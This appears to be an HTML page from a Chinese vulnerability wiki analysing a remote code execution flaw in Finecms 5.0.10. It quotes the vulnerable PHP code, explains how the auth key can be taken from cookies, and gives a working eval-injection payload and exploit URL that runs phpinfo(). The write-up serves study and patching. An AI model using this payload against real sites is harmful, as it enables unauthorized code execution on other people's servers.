@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Finecms/Finecms%205.0.10%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Finecms 5.0.10 任意代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Finecms 5.0.10 \u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Finecms%205.0.10%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Finecms%205.0.10%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Finecms 5.0.10 任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Finecms%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Finecms%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Finecms 5.0.10 sql注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="finecms-5010">Finecms 5.0.10 任意代码执行漏洞<a class="headerlink" href="#finecms-5010" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>auth值是由<code>zero_ci_session</code>中zero进行md5加密获取到的，无需登陆便有，且每个站点的站长会进行不同的自定义</p>
+</blockquote>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Finecms 5.0.10</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>这个漏洞的文件在<code>/finecms/dayrui/controllers/Api.php</code>的data2()</p>
+<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">data2</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+
+<span class="w">        </span><span class="c1">// 安全码认证</span>
+<span class="w">        </span><span class="err">$</span><span class="n">auth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;auth&#39;</span><span class="p">,</span><span class="w"> </span><span class="kr">true</span><span class="p">);</span>
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">auth</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">md5</span><span class="p">(</span><span class="n">SYS_KEY</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 授权认证码不正确</span>
+<span class="w">            </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s">&#39;msg&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s">&#39;授权认证码不正确&#39;</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;code&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="n">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 解析数据</span>
+<span class="w">            </span><span class="err">$</span><span class="n">cache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">;</span>
+<span class="w">            </span><span class="err">$</span><span class="n">param</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;param&#39;</span><span class="p">);</span>
+<span class="w">            </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">param</span><span class="p">[</span><span class="s">&#39;cache&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">$</span><span class="n">param</span><span class="p">[</span><span class="s">&#39;cache&#39;</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="err">$</span><span class="n">cache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">md5</span><span class="p">(</span><span class="n">dr_array2string</span><span class="p">(</span><span class="err">$</span><span class="n">param</span><span class="p">));</span>
+<span class="w">                </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">get_cache_data</span><span class="p">(</span><span class="err">$</span><span class="n">cache</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">            </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="err">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">                </span><span class="c1">// list数据查询</span>
+<span class="w">                </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">template</span><span class="o">-&gt;</span><span class="n">list_tag</span><span class="p">(</span><span class="err">$</span><span class="n">param</span><span class="p">);</span>
+<span class="w">                </span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s">&#39;code&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s">&#39;error&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">                </span><span class="n">unset</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s">&#39;sql&#39;</span><span class="p">],</span><span class="w"> </span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s">&#39;pages&#39;</span><span class="p">]);</span>
+
+<span class="w">                </span><span class="c1">// 缓存数据</span>
+<span class="w">                </span><span class="err">$</span><span class="n">cache</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">set_cache_data</span><span class="p">(</span><span class="err">$</span><span class="n">cache</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">param</span><span class="p">[</span><span class="s">&#39;cache&#39;</span><span class="p">]);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="c1">// 接收参数</span>
+<span class="w">        </span><span class="err">$</span><span class="n">format</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;format&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="err">$</span><span class="kr">function</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;function&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="kr">function</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">function_exists</span><span class="p">(</span><span class="err">$</span><span class="kr">function</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s">&#39;msg&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">fc_lang</span><span class="p">(</span><span class="s">&#39;自定义函数&#39;</span><span class="p">.</span><span class="err">$</span><span class="kr">function</span><span class="p">.</span><span class="s">&#39;不存在&#39;</span><span class="p">),</span><span class="w"> </span><span class="s">&#39;code&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="n">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="kr">function</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">);</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="c1">// 页面输出</span>
+<span class="w">        </span><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">format</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&#39;php&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">print_r</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="n">elseif</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">format</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&#39;jsonp&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 自定义返回名称</span>
+<span class="w">            </span><span class="n">echo</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">input</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;callback&#39;</span><span class="p">,</span><span class="w"> </span><span class="kr">TRUE</span><span class="p">).</span><span class="s">&#39;(&#39;</span><span class="p">.</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">callback_json</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">).</span><span class="s">&#39;)&#39;</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="n">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// 自定义返回名称</span>
+<span class="w">            </span><span class="n">echo</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">callback_json</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">;</span>
+
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<p>可以看到开头这里验证了认证码：</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// 安全码认证</span>
+<span class="w">    </span><span class="no">$</span><span class="n">auth</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="no">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="nb">input</span><span class="o">-&gt;</span><span class="k">get</span><span class="p">(</span><span class="s">&#39;auth&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">true</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="no">$</span><span class="n">auth</span><span class="w"> </span>!<span class="p">=</span><span class="w"> </span><span class="n">md5</span><span class="p">(</span><span class="n">SYS_KEY</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 授权认证码不正确</span>
+<span class="w">        </span><span class="no">$</span><span class="n">data</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s">&#39;msg&#39;</span><span class="w"> </span><span class="p">=</span><span class="o">&gt;</span><span class="w"> </span><span class="s">&#39;授权认证码不正确&#39;</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;code&#39;</span><span class="w"> </span><span class="p">=</span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+</code></pre></div>
+
+<p>授权码在<code>/config/system.php</code></p>
+<p><img alt="" src="../resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" />可以看到SYS_KEY是固定的，我们可以在Cookies找到，<code>/finecms/dayrui/config/config.php</code></p>
+<p><img alt="" src="../resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
+<p>用浏览器查看Cookies可以看到KEY，但是验证用MD5，我们先把KEY加密就行了。</p>
+<p><img alt="" src="../resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
+<p>直接看到这一段，调用了Template对象里面的list_tag函数</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="err">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="c1">// list数据查询</span>
+<span class="w">    </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">template</span><span class="o">-&gt;</span><span class="n">list_tag</span><span class="p">(</span><span class="err">$</span><span class="n">param</span><span class="p">);</span>
+<span class="w">    </span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s">&#39;code&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s">&#39;error&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="w">    </span><span class="n">unset</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s">&#39;sql&#39;</span><span class="p">],</span><span class="w"> </span><span class="err">$</span><span class="n">data</span><span class="p">[</span><span class="s">&#39;pages&#39;</span><span class="p">]);</span>
+
+<span class="w">    </span><span class="c1">// 缓存数据</span>
+<span class="w">    </span><span class="err">$</span><span class="n">cache</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">set_cache_data</span><span class="p">(</span><span class="err">$</span><span class="n">cache</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">param</span><span class="p">[</span><span class="s">&#39;cache&#39;</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>我们到<code>finecms/dayrui/libraries/Template.php</code>看list_tag函数的代码,代码有点长，我抓重点的地方,这里把<code>param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271</code>的内容分为两个数组$var、$val，这两个数组的内容分别为</p>
+<div class="codehilite"><pre><span></span><code><span class="o">$</span><span class="k">var</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="p">]</span>
+<span class="o">$</span><span class="n">val</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;cache%20&#39;</span><span class="p">,</span><span class="s1">&#39;MEMBER.1%27];phpinfo();$a=[%271&#39;</span><span class="p">]</span>
+</code></pre></div>
+
+<p>$cache=_cache_var是返回会员的信息 重点的是下面的
+<code>@eval('$data=$cache'.$this-&gt;_get_var($_param).';');</code></p>
+<div class="codehilite"><pre><span></span><code><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">params</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="k">var</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">t</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">strpos</span><span class="p">(</span><span class="o">$</span><span class="n">t</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;=&#39;</span><span class="p">));</span>
+<span class="w">            </span><span class="o">$</span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">t</span><span class="p">,</span><span class="w"> </span><span class="n">strpos</span><span class="p">(</span><span class="o">$</span><span class="n">t</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;=&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+</code></pre></div>
+
+<p>再看这一段,因为swtich选中的是cache，所有就不再进行下面的分析了。
+<code>$pos = strpos($param['name'], '.');</code>这句是为下面的substr函数做准备。
+是为了分离出的内容为</p>
+<div class="codehilite"><pre><span></span><code><span class="o">$</span><span class="n">_name</span><span class="o">=</span><span class="s1">&#39;MEMBER&#39;</span>
+<span class="o">$</span><span class="n">_param</span><span class="o">=</span><span class="s2">&quot;1%27];phpinfo();$a=[%271&quot;</span>
+<span class="o">//</span><span class="w"> </span><span class="n">action</span>
+<span class="w">        </span><span class="n">switch</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">system</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">            </span><span class="n">case</span><span class="w"> </span><span class="s1">&#39;cache&#39;</span><span class="p">:</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="err">系统缓存数据</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">param</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_return</span><span class="p">(</span><span class="o">$</span><span class="n">system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;name参数不存在&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span>
+
+<span class="w">                </span><span class="o">$</span><span class="n">pos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strpos</span><span class="p">(</span><span class="o">$</span><span class="n">param</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">pos</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="n">FALSE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">param</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">pos</span><span class="p">);</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">_param</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">param</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span><span class="w"> </span><span class="o">$</span><span class="n">pos</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">param</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">_param</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NULL</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">                </span><span class="o">$</span><span class="n">cache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_cache_var</span><span class="p">(</span><span class="o">$</span><span class="n">_name</span><span class="p">,</span><span class="w"> </span><span class="o">!$</span><span class="n">system</span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">]</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="n">SITE_ID</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="o">$</span><span class="n">system</span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">]);</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!$</span><span class="n">cache</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_return</span><span class="p">(</span><span class="o">$</span><span class="n">system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span><span class="w"> </span><span class="s2">&quot;缓存({$_name})不存在，请在后台更新缓存&quot;</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">_param</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">array</span><span class="p">();</span>
+<span class="w">                    </span><span class="err">@</span><span class="n">eval</span><span class="p">(</span><span class="s1">&#39;$data=$cache&#39;</span><span class="o">.$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_get_var</span><span class="p">(</span><span class="o">$</span><span class="n">_param</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
+<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                        </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_return</span><span class="p">(</span><span class="o">$</span><span class="n">system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span><span class="w"> </span><span class="s2">&quot;缓存({$_name})参数不存在!!&quot;</span><span class="p">);</span>
+<span class="w">                    </span><span class="p">}</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">cache</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span>
+
+<span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_return</span><span class="p">(</span><span class="o">$</span><span class="n">system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="k">break</span><span class="p">;</span>
+</code></pre></div>
+
+<p>跟踪get_var函数，在这里我们先把$param的内容假设为a,然后执行函数里面的内容，最后返回的$string的内容是：</p>
+<div class="codehilite"><pre><span></span><code>$string=[&#39;a&#39;]
+</code></pre></div>
+
+<p>那么我们的思路就是把两边的[\' \']闭合然后再放上恶意的代码。
+payload为：<code>1'];phpinfo();$a=['1</code>那么返回的$string的内容：</p>
+<div class="codehilite"><pre><span></span><code>$string=[&#39;1&#39;];phpinfo();$a=[&#39;1&#39;]
+</code></pre></div>
+
+<h3 id="_5">漏洞复线<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="nt">http</span><span class="o">://</span><span class="nt">0-sec</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">index</span><span class="p">.</span><span class="nc">php</span><span class="o">?</span><span class="nt">c</span><span class="o">=</span><span class="nt">api</span><span class="o">&amp;</span><span class="nt">m</span><span class="o">=</span><span class="nt">data2</span><span class="o">&amp;</span><span class="nt">auth</span><span class="o">=</span><span class="nt">目标站点的值</span><span class="o">&amp;</span><span class="nt">param</span><span class="o">=</span><span class="nt">action</span><span class="o">=</span><span class="nt">cache</span><span class="o">%</span><span class="nt">20name</span><span class="o">=</span><span class="nt">MEMBER</span><span class="p">.</span><span class="nc">1</span><span class="o">%</span><span class="nt">27</span><span class="o">];</span><span class="nt">phpinfo</span><span class="o">();$</span><span class="nt">a</span><span class="o">=</span><span class="cp">[</span><span class="o">%</span><span class="mi">271</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/Finecms5.0.10%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Finecms%205.0.10%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Finecms%205.0.10%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Finecms 5.0.10 任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Finecms%205.0.10%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
